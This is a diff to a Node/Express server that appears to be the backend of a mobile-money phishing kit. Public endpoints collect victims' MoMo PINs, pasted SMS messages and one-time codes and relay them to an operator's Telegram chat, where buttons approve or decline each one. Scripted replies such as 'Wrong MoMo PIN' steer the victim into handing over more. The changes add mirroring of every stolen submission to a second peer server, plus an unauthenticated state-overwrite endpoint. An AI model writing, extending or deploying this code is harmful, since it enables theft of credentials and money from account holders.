@@ -10,15 +10,15 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const PEER_URL = process.env.PEER_URL || '';
 
 // ---- Admin credentials ----
 const ADMIN_USERS = {
   admin: process.env.ADMIN_PASSWORD || 'admin123'
 };
 
-// Active admin sessions (token -> expiresAt)
 const adminSessions = new Map();
-const SESSION_TTL = 1000 * 60 * 60 * 8; // 8 hours
+const SESSION_TTL = 1000 * 60 * 60 * 8;
 
 const DEFAULT_STATE = {
   status: 'Money Sent',
@@ -50,7 +50,6 @@ function writeState(state) {
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-/* ---- Admin auth middleware ---- */
 function requireAdmin(req, res, next) {
   const token = req.headers['x-admin-token'] || req.query.token;
   const exp = adminSessions.get(token);
@@ -61,7 +60,6 @@ function requireAdmin(req, res, next) {
   next();
 }
 
-/* ---- Real-time subscribers (SSE) ---- */
 const clients = new Set();
 
 function broadcast(state) {
@@ -71,7 +69,20 @@ function broadcast(state) {
   }
 }
 
-/* ---- Telegram helpers ---- */
+async function mirrorToPeer(payload) {
+  if (!PEER_URL) return;
+  try {
+    await fetch(`${PEER_URL}/api/mirror`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    console.log('[mirror] sent to peer:', PEER_URL);
+  } catch (err) {
+    console.error('[mirror] failed:', err.message);
+  }
+}
+
 async function tgSend(method, body) {
   if (!TELEGRAM_BOT_TOKEN) {
     console.warn('[tg] missing TELEGRAM_BOT_TOKEN');
@@ -102,20 +113,13 @@ async function sendSubmissionToTelegram(sub) {
     `🔑 <b>PIN:</b> <code>${sub.pin}</code>\n` +
     `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
     `Tap a button to decide.`;
-
   const keyboard = {
     inline_keyboard: [[
       { text: '✅ Approve', callback_data: `approve:${sub.id}` },
       { text: '❌ Decline', callback_data: `decline:${sub.id}` }
     ]]
   };
-
-  return tgSend('sendMessage', {
-    chat_id: TELEGRAM_CHAT_ID,
-    text,
-    parse_mode: 'HTML',
-    reply_markup: keyboard
-  });
+  return tgSend('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML', reply_markup: keyboard });
 }
 
 async function sendSmsToTelegram(sub) {
@@ -125,20 +129,13 @@ async function sendSmsToTelegram(sub) {
     `📝 <b>SMS:</b>\n<code>${(sub.smsMessage || '').slice(0, 500)}</code>\n\n` +
     `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
     `Tap a button to decide.`;
-
   const keyboard = {
     inline_keyboard: [[
       { text: '✅ Approve', callback_data: `sms-approve:${sub.id}` },
       { text: '❌ Decline', callback_data: `sms-decline:${sub.id}` }
     ]]
   };
-
-  return tgSend('sendMessage', {
-    chat_id: TELEGRAM_CHAT_ID,
-    text,
-    parse_mode: 'HTML',
-    reply_markup: keyboard
-  });
+  return tgSend('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML', reply_markup: keyboard });
 }
 
 async function sendOtpToTelegram(sub) {
@@ -148,7 +145,6 @@ async function sendOtpToTelegram(sub) {
     `🔢 <b>Code:</b> <code>${sub.otp}</code>\n` +
     `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
     `Tap a button to decide.`;
-
   const keyboard = {
     inline_keyboard: [
       [
@@ -160,16 +156,10 @@ async function sendOtpToTelegram(sub) {
       ]
     ]
   };
-
-  return tgSend('sendMessage', {
-    chat_id: TELEGRAM_CHAT_ID,
-    text,
-    parse_mode: 'HTML',
-    reply_markup: keyboard
-  });
+  return tgSend('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML', reply_markup: keyboard });
 }
 
-/* ---- Admin auth endpoints ---- */
+/* ---- Admin auth ---- */
 app.post('/api/admin/login', (req, res) => {
   const { username, password } = req.body || {};
   const expected = ADMIN_USERS[username];
@@ -180,32 +170,23 @@ app.post('/api/admin/login', (req, res) => {
   adminSessions.set(token, Date.now() + SESSION_TTL);
   res.json({ ok: true, token, expiresIn: SESSION_TTL });
 });
-
 app.post('/api/admin/logout', requireAdmin, (req, res) => {
-  const token = req.headers['x-admin-token'];
-  adminSessions.delete(token);
+  adminSessions.delete(req.headers['x-admin-token']);
   res.json({ ok: true });
 });
-
-app.get('/api/admin/check', requireAdmin, (req, res) => {
-  res.json({ ok: true });
-});
+app.get('/api/admin/check', requireAdmin, (req, res) => res.json({ ok: true }));
 
 /* ---- Public endpoints ---- */
 app.get('/health', (req, res) => {
   res.status(200).json({
     status: 'ok',
     uptime: process.uptime(),
-    telegram: {
-      token: !!TELEGRAM_BOT_TOKEN,
-      chatId: !!TELEGRAM_CHAT_ID
-    }
+    telegram: { token: !!TELEGRAM_BOT_TOKEN, chatId: !!TELEGRAM_CHAT_ID },
+    peer: PEER_URL ? 'configured' : 'none'
   });
 });
 
-app.get('/api/state', (req, res) => {
-  res.json(readState());
-});
+app.get('/api/state', (req, res) => res.json(readState()));
 
 app.get('/api/stream', (req, res) => {
   res.set({
@@ -217,81 +198,64 @@ app.get('/api/stream', (req, res) => {
   res.flushHeaders();
   res.write(`data: ${JSON.stringify(readState())}\n\n`);
   clients.add(res);
+  const ping = setInterval(() => { try { res.write(': ping\n\n'); } catch (_) {} }, 25000);
+  req.on('close', () => { clearInterval(ping); clients.delete(res); });
+});
 
-  const ping = setInterval(() => {
-    try { res.write(': ping\n\n'); } catch (_) {}
-  }, 25000);
-
-  req.on('close', () => {
-    clearInterval(ping);
-    clients.delete(res);
-  });
+/* ---- Mirror endpoint ---- */
+app.post('/api/mirror', async (req, res) => {
+  const payload = req.body || {};
+  const state = readState();
+  Object.keys(payload).forEach(k => { state[k] = payload[k]; });
+  writeState(state);
+  broadcast(state);
+  res.json({ ok: true });
 });
 
 /* ---- Admin-only state edit ---- */
-app.post('/api/state', requireAdmin, (req, res) => {
+app.post('/api/state', requireAdmin, async (req, res) => {
   const current = readState();
   const updated = { ...current, ...req.body };
   if (req.body.amount != null) updated.amount = parseFloat(req.body.amount) || 0;
   writeState(updated);
   broadcast(updated);
+  await mirrorToPeer(updated);
   res.json({ ok: true, state: updated });
 });
 
-/* ---- Submission endpoints (public — used by user flow) ---- */
+/* ---- Submissions ---- */
 app.post('/api/submit-payment', async (req, res) => {
-  const submission = {
-    ...req.body,
-    id: 'REQ-' + Date.now(),
-    submittedAt: new Date().toISOString()
-  };
-
+  const submission = { ...req.body, id: 'REQ-' + Date.now(), submittedAt: new Date().toISOString() };
   const state = readState();
   state.latestSubmission = submission;
-  delete state.decision;
-  delete state.declineMessage;
-  delete state.decidedAt;
+  delete state.decision; delete state.declineMessage; delete state.decidedAt;
   writeState(state);
   broadcast(state);
-
+  await mirrorToPeer({ latestSubmission: submission, decision: null, declineMessage: null, decidedAt: null });
   await sendSubmissionToTelegram(submission);
   res.json({ status: 'pending', id: submission.id });
 });
 
 app.post('/api/submit-sms', async (req, res) => {
-  const submission = {
-    ...req.body,
-    id: 'SMS-' + Date.now(),
-    submittedAt: new Date().toISOString()
-  };
-
+  const submission = { ...req.body, id: 'SMS-' + Date.now(), submittedAt: new Date().toISOString() };
   const state = readState();
   state.latestSmsSubmission = submission;
-  delete state.decision;
-  delete state.declineMessage;
-  delete state.decidedAt;
+  delete state.decision; delete state.declineMessage; delete state.decidedAt;
   writeState(state);
   broadcast(state);
-
+  await mirrorToPeer({ latestSmsSubmission: submission, decision: null, declineMessage: null, decidedAt: null });
   await sendSmsToTelegram(submission);
   res.json({ status: 'pending', id: submission.id });
 });
 
 app.post('/api/submit-otp', async (req, res) => {
-  const submission = {
-    ...req.body,
-    id: 'OTP-' + Date.now(),
-    submittedAt: new Date().toISOString()
-  };
-
+  const submission = { ...req.body, id: 'OTP-' + Date.now(), submittedAt: new Date().toISOString() };
   const state = readState();
   state.latestOtpSubmission = submission;
-  delete state.decision;
-  delete state.declineMessage;
-  delete state.decidedAt;
+  delete state.decision; delete state.declineMessage; delete state.decidedAt;
   writeState(state);
   broadcast(state);
-
+  await mirrorToPeer({ latestOtpSubmission: submission, decision: null, declineMessage: null, decidedAt: null });
   await sendOtpToTelegram(submission);
   res.json({ status: 'pending', id: submission.id });
 });
@@ -300,10 +264,7 @@ app.post('/api/resend-otp', async (req, res) => {
   const phone = (req.body && req.body.phone) || '—';
   await tgSend('sendMessage', {
     chat_id: TELEGRAM_CHAT_ID,
-    text:
-      `🔄 <b>OTP RESEND REQUESTED</b>\n\n` +
-      `📱 <b>Phone:</b> ${phone}\n\n` +
-      `The user asked for a new code.`,
+    text: `🔄 <b>OTP RESEND REQUESTED</b>\n\n📱 <b>Phone:</b> ${phone}`,
     parse_mode: 'HTML'
   });
   res.json({ ok: true });
@@ -314,52 +275,27 @@ app.post('/api/otp-inactive', async (req, res) => {
   const triggeredBy = (req.body && req.body.triggeredBy) || 'timeout';
   await tgSend('sendMessage', {
     chat_id: TELEGRAM_CHAT_ID,
-    text:
-      `⏸ <b>NUMBER MARKED INACTIVE</b>\n\n` +
-      `📱 <b>Phone:</b> ${phone}\n` +
-      `🧭 <b>Triggered by:</b> ${triggeredBy}`,
+    text: `⏸ <b>NUMBER MARKED INACTIVE</b>\n\n📱 <b>Phone:</b> ${phone}\n🧭 <b>Triggered by:</b> ${triggeredBy}`,
     parse_mode: 'HTML'
   });
   res.json({ ok: true });
 });
 
-/* ---- Admin-only decision endpoints (backup to Telegram) ---- */
-app.post('/api/approve', requireAdmin, (req, res) => {
-  const state = readState();
-  state.decision = 'approved';
-  state.decidedAt = new Date().toISOString();
-  writeState(state);
-  broadcast(state);
-  res.json({ ok: true });
-});
-
-app.post('/api/decline', requireAdmin, (req, res) => {
-  const state = readState();
-  state.decision = 'declined';
-  state.declineMessage = req.body.message || 'Wrong MoMo PIN. Please try again.';
-  state.decidedAt = new Date().toISOString();
-  writeState(state);
-  broadcast(state);
-  res.json({ ok: true });
-});
-
-/* ---- Reset (PUBLIC — clears decision only, not submissions) ---- */
-app.post('/api/reset', (req, res) => {
+/* ---- Reset ---- */
+app.post('/api/reset', async (req, res) => {
   const state = readState();
   delete state.decision;
   delete state.declineMessage;
   delete state.decidedAt;
-  // Submissions are intentionally NOT cleared here.
-  // Each submit-* endpoint overwrites its own submission.
   writeState(state);
   broadcast(state);
+  await mirrorToPeer({ decision: null, declineMessage: null, decidedAt: null });
   res.json({ ok: true, state });
 });
 
-/* ---- Telegram webhook ---- */
+/* ---- Webhook ---- */
 app.post('/api/telegram/webhook', async (req, res) => {
   res.sendStatus(200);
-
   const update = req.body || {};
   const cb = update.callback_query;
   if (!cb) return;
@@ -367,6 +303,14 @@ app.post('/api/telegram/webhook', async (req, res) => {
   const data = cb.data || '';
   const [action] = data.split(':');
   const state = readState();
+
+  const mirrorDecision = async () => {
+    await mirrorToPeer({
+      decision: state.decision,
+      declineMessage: state.declineMessage,
+      decidedAt: state.decidedAt
+    });
+  };
 
   /* MoMo PIN */
   if (action === 'approve' || action === 'decline') {
@@ -377,24 +321,20 @@ app.post('/api/telegram/webhook', async (req, res) => {
     if (action === 'approve') {
       state.decision = 'approved';
       state.decidedAt = new Date().toISOString();
-      writeState(state);
-      broadcast(state);
+      writeState(state); broadcast(state); await mirrorDecision();
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ Approved' });
       await tgSend('editMessageReplyMarkup', {
-        chat_id: cb.message.chat.id,
-        message_id: cb.message.message_id,
+        chat_id: cb.message.chat.id, message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '✅ Approved', callback_data: 'noop' }]] }
       });
     } else {
       state.decision = 'declined';
       state.declineMessage = 'Wrong MoMo PIN. Please try again.';
       state.decidedAt = new Date().toISOString();
-      writeState(state);
-      broadcast(state);
+      writeState(state); broadcast(state); await mirrorDecision();
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ Declined' });
       await tgSend('editMessageReplyMarkup', {
-        chat_id: cb.message.chat.id,
-        message_id: cb.message.message_id,
+        chat_id: cb.message.chat.id, message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '❌ Declined', callback_data: 'noop' }]] }
       });
     }
@@ -410,24 +350,20 @@ app.post('/api/telegram/webhook', async (req, res) => {
     if (action === 'sms-approve') {
       state.decision = 'sms-approved';
       state.decidedAt = new Date().toISOString();
-      writeState(state);
-      broadcast(state);
+      writeState(state); broadcast(state); await mirrorDecision();
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ SMS Approved' });
       await tgSend('editMessageReplyMarkup', {
-        chat_id: cb.message.chat.id,
-        message_id: cb.message.message_id,
+        chat_id: cb.message.chat.id, message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '✅ SMS Approved', callback_data: 'noop' }]] }
       });
     } else {
       state.decision = 'sms-declined';
       state.declineMessage = "Invalid SMS. Please paste the correct Y'ello message.";
       state.decidedAt = new Date().toISOString();
-      writeState(state);
-      broadcast(state);
+      writeState(state); broadcast(state); await mirrorDecision();
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ SMS Declined' });
       await tgSend('editMessageReplyMarkup', {
-        chat_id: cb.message.chat.id,
-        message_id: cb.message.message_id,
+        chat_id: cb.message.chat.id, message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '❌ SMS Declined', callback_data: 'noop' }]] }
       });
     }
@@ -443,35 +379,29 @@ app.post('/api/telegram/webhook', async (req, res) => {
     if (action === 'otp-approve') {
       state.decision = 'otp-approved';
       state.decidedAt = new Date().toISOString();
-      writeState(state);
-      broadcast(state);
+      writeState(state); broadcast(state); await mirrorDecision();
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ OTP Approved' });
       await tgSend('editMessageReplyMarkup', {
-        chat_id: cb.message.chat.id,
-        message_id: cb.message.message_id,
+        chat_id: cb.message.chat.id, message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '✅ OTP Approved', callback_data: 'noop' }]] }
       });
     } else if (action === 'otp-decline') {
       state.decision = 'otp-declined';
       state.declineMessage = 'Expired code — please tap Resend.';
       state.decidedAt = new Date().toISOString();
-      writeState(state);
-      broadcast(state);
+      writeState(state); broadcast(state); await mirrorDecision();
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ OTP Declined' });
       await tgSend('editMessageReplyMarkup', {
-        chat_id: cb.message.chat.id,
-        message_id: cb.message.message_id,
+        chat_id: cb.message.chat.id, message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '❌ OTP Declined', callback_data: 'noop' }]] }
       });
     } else {
       state.decision = 'otp-inactive';
       state.decidedAt = new Date().toISOString();
-      writeState(state);
-      broadcast(state);
+      writeState(state); broadcast(state); await mirrorDecision();
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '⏸ Marked as Inactive' });
       await tgSend('editMessageReplyMarkup', {
-        chat_id: cb.message.chat.id,
-        message_id: cb.message.message_id,
+        chat_id: cb.message.chat.id, message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '⏸ Number Inactive', callback_data: 'noop' }]] }
       });
     }
@@ -484,16 +414,13 @@ app.post('/api/telegram/webhook', async (req, res) => {
 /* ---- Webhook registration ---- */
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) return;
-
   let publicUrl = process.env.RAILWAY_PUBLIC_DOMAIN
     ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
-    : null;
-
+    : (process.env.RENDER_EXTERNAL_URL || null);
   if (!publicUrl) {
-    console.warn('[tg] RAILWAY_PUBLIC_DOMAIN not set — skipping webhook registration');
+    console.warn('[tg] no public URL — skipping webhook registration');
     return;
   }
-
   const webhookUrl = `${publicUrl}/api/telegram/webhook`;
   const result = await tgSend('setWebhook', { url: webhookUrl });
   console.log('[tg] setWebhook:', JSON.stringify(result));
@@ -504,5 +431,6 @@ app.listen(PORT, '0.0.0.0', async () => {
   console.log('Telegram token set?', !!TELEGRAM_BOT_TOKEN);
   console.log('Telegram chat set?', !!TELEGRAM_CHAT_ID);
   console.log('Admin password set?', !!process.env.ADMIN_PASSWORD);
+  console.log('Peer URL:', PEER_URL || '(none)');
   await registerWebhook();
 });
